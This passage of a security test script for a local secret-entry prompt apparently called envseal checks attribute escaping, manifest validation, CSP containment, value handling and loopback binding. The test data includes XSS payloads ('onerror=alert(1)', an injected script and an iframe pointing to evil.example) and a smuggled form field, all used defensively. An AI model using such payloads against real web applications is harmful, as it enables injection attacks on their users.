  const idBreakout = /<section class="key" id="field-[^"]*"\s*>\s*<img/.test(html2) ||
    html2.includes('<img src=x onerror=');
  check(
    'W3-01 hostile key name does NOT break out of the id="" attribute',
    !idBreakout,
    idBreakout
      ? 'BREAKOUT: id attribute interpolated without escapeHtml (loopback.ts:104,108)'
      : 'escaped',
  );

  await p.close();
  await q.close();
  await p.settled;
  await q.settled;
}

// ===========================================================================
// A10b — Is W3-01 reachable through the product path?
// ===========================================================================
section('A10b  W3-01 reachability: can a hostile key name reach the prompter?');
{
  const { mkdtempSync, writeFileSync, rmSync } = await import('node:fs');
  const { tmpdir } = await import('node:os');
  const { join } = await import('node:path');
  const { loadManifest, projectPaths } = await import('../packages/core/dist/index.js');

  const root = mkdtempSync(join(tmpdir(), 'envseal-w3-manifest-'));
  writeFileSync(join(root, '.gitignore'), '.env\n', 'utf8');
  // A malicious PR writes env.schema.jsonc by hand — it never goes through
  // env_declare, so the only gate is loadManifest's schema check.
  writeFileSync(
    join(root, 'env.schema.jsonc'),
    JSON.stringify({
      version: 1,
      entries: [
        {
          key: 'A"><img src=x onerror=alert(1)>',
          description: 'hostile',
          required: true,
          secret: true,
          sink: 'dotenv',
        },
      ],
    }),
    'utf8',
  );
  const paths = projectPaths(root);
  const loaded = loadManifest(paths);
  check(
    'W3-01 a hand-written manifest with a hostile key name is rejected by loadManifest',
    loaded === null,
    loaded === null
      ? 'Manifest.safeParse fails -> manifest treated as absent; key never reaches the prompter'
      : `REACHABLE: loaded key = ${JSON.stringify(loaded.entries[0]?.key)}`,
  );
  // Sanity: the same manifest with a legal key name must load, so the check
  // above is testing the key regex and not a broken fixture.
  writeFileSync(
    join(root, 'env.schema.jsonc'),
    JSON.stringify({
      version: 1,
      entries: [
        { key: 'OPENAI_API_KEY', description: 'ok', required: true, secret: true, sink: 'dotenv' },
      ],
    }),
    'utf8',
  );
  const good = loadManifest(paths);
  check(
    'control: a well-formed manifest does load (fixture is valid)',
    good !== null && good.entries[0]?.key === 'OPENAI_API_KEY',
    good === null ? 'fixture broken' : 'loads',
  );
  rmSync(root, { recursive: true, force: true });
}

// ===========================================================================
// A10c — CSP containment: even with injection, can markup execute?
// ===========================================================================
section('A10c  CSP containment of an injected payload');
{
  const q = await startPrompt({
    keys: [{ key: 'A"><script>x=1</script><iframe src=http://evil.example>', description: 'x' }],
  });
  const { page } = await csrfOf(q);
  const csp = headerOf(page, 'Content-Security-Policy') ?? '';
  const html = page.body.split('\r\n\r\n').slice(1).join('\r\n\r\n');
  const injectedScripts = [...html.matchAll(/<script(?![^>]*nonce=)/g)].length;
  check(
    'an injected <script> carries no nonce, so script-src blocks it',
    injectedScripts > 0 ? !/script-src[^;]*unsafe-inline/.test(csp) : true,
    `injected nonce-less <script> tags=${injectedScripts}; script-src is nonce-only`,
  );
  check(
    "an injected <iframe> is blocked by default-src 'none' (frame-src falls back)",
    /default-src\s+'none'/.test(csp) && !/frame-src/.test(csp),
    csp,
  );
  check(
    "an injected <base> is blocked by base-uri 'none'",
    /base-uri\s+'none'/.test(csp),
  );
  check(
    "an injected <form action=evil> is blocked by form-action 'self'",
    /form-action\s+'self'/.test(csp),
  );
  console.log(
    '  NOTE: CSP does not restrict top-level navigation (no navigate-to in any shipping browser),',
  );
  console.log(
    '        so script execution would still permit location-based exfiltration — but script',
  );
  console.log('        execution itself requires the per-response script nonce, which is unguessable.');
  await q.close();
  await q.settled;
}

// ===========================================================================
// A11 — Value handling on the wire
// ===========================================================================
section('A11  Value handling');
{
  const p = await startPrompt({
    keys: [
      { key: 'OPENAI_API_KEY', description: 'a', optional: true },
      { key: 'SECOND_KEY', description: 'b', optional: true },
    ],
  });
  const { csrf } = await csrfOf(p);
  const res = await post(
    p.port,
    `/t/${p.pathNonce}`,
    new URLSearchParams({
      csrf,
      'env_value.OPENAI_API_KEY': 'sk-W3SENTINEL-VALUE',
      'env_skip.SECOND_KEY': '1',
      'env_value.SECOND_KEY': 'sk-SHOULD-BE-IGNORED',
      'env_value.NOT_REQUESTED': 'sk-SMUGGLED',
    }).toString(),
    { Host: p.host },
  );
  check('successful POST -> 200', statusOf(res) === 200, `observed ${statusOf(res)}`);
  check(
    'success response body never echoes the submitted value',
    !res.body.includes('W3SENTINEL'),
    res.body.split('\r\n\r\n').slice(1).join(''),
  );
  const outcome = await p.settled;
  const results = outcome.value.results;
  check(
    'only requested keys are returned',
    results.length === 2 && results.every((r) => r.key !== 'NOT_REQUESTED'),
    JSON.stringify(results.map((r) => r.key)),
  );
  check(
    'skip checkbox wins over a submitted value for the same key',
    results.find((r) => r.key === 'SECOND_KEY')?.outcome === 'skipped',
    JSON.stringify(results.map((r) => [r.key, r.outcome])),
  );
  check(
    'a skipped key carries no value',
    results.find((r) => r.key === 'SECOND_KEY')?.value === undefined,
  );
}

// ===========================================================================
// A12 — §5.2 mechanics 1 and 9 (bind scope, timeout teardown)
// ===========================================================================
section('A12  Bind scope and timeout teardown');
{
  const p = await startPrompt();
  // Mechanic 1: IPv4 loopback only — not ::1, not a routable interface.
  const v6 = await raw(p.port, `GET /t/${p.pathNonce} HTTP/1.1\r\nHost: ${p.host}\r\n\r\n`, {
    host: '::1',
    timeoutMs: 2500,
  });
  check(
    'not reachable over IPv6 loopback ::1',
    v6.event === 'error' || v6.event === 'timeout',
    `event=${v6.event} code=${v6.code ?? '-'}`,
  );
  const { networkInterfaces } = await import('node:os');
  const external = Object.entries(networkInterfaces())
    .flatMap(([name, addrs]) => (addrs ?? []).map((a) => [name, a]))
    .filter(([, a]) => !a.internal && a.family === 'IPv4');
  if (external.length === 0) {
    console.log('  NOTE  no routable IPv4 interface on this host; external check skipped');
  }
  for (const [name, a] of external) {
    const r = await raw(p.port, `GET /t/${p.pathNonce} HTTP/1.1\r\nHost: ${p.host}\r\n\r\n`, {
      host: a.address,
      timeoutMs: 2500,
    });
    check(
      `not reachable on routable interface ${name} (${a.address})`,
      r.event === 'error' || r.event === 'timeout',
      `event=${r.event} code=${r.code ?? '-'}`,
    );
  }
  await p.close();
  await p.settled;

  // Mechanic 9: on timeout the listener closes, the ticket is marked timeout,
  // and the port is released.
  const q = await startPrompt({ timeoutMs: 1200 });
  const before = await get(q.port, `/t/${q.pathNonce}`, { Host: q.host });
  check('listener is live before the timeout', statusOf(before) === 200, `observed ${statusOf(before)}`);
  const outcome = await q.settled;
  check(
    'timeout marks every key `timeout`',
    outcome.value.results.length > 0 && outcome.value.results.every((r) => r.outcome === 'timeout'),
    JSON.stringify(outcome.value.results.map((r) => r.outcome)),
  );
  const after = await raw(q.port, `GET /t/${q.pathNonce} HTTP/1.1\r\nHost: ${q.host}\r\n\r\n`);
  check(
    'port is released after the timeout (connection refused)',
    after.event === 'error' || after.body === '',
    `event=${after.event} code=${after.code ?? '-'}`,
  );
}

// ===========================================================================
section('Summary');
console.log(`  pass=${pass} fail=${fail}`);
if (findings.length > 0) {
  console.log('  failing checks:');
  for (const f of findings) console.log(`    - ${f}`);
}
process.exit(0);
